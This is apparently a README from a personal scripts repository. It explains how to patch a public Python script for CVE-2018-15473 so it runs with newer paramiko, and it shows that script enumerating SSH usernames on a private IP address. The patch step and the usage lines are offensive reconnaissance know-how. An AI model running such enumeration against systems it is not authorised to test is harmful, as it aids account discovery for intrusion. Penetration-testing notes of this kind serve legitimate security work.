# Scripts
I will be putting fixed, modified or created scripts here that are not necessarily part of a project.

# ssh-check-username.py
Original: https://bugfuzz.com/stuff/ssh-check-username.py<br />
I had an issue running this script with the current Kali. The problem is with changes to paramiko. See: https://github.com/paramiko/paramiko/issues/1314

The solution is to replace instances of the text '_handler_table' with '_client_handler_table'.<br />
I will place the fixed file on this repo.<br />

The purpose of this script is to use a recent vulnerability, CVE-2018-15473, to enumerate users on a system through ssh.<br />
Usage:<br />
root@kali:/media/veracrypt1/2_linux/9F18c/scripts/python# python ssh-check-username.py 10.0.0.20 bob<br />
[*] Invalid username<br />
root@kali:/media/veracrypt1/2_linux/9F18c/scripts/python# python ssh-check-username.py 10.0.0.20 root<br />
[+] Valid username<br />
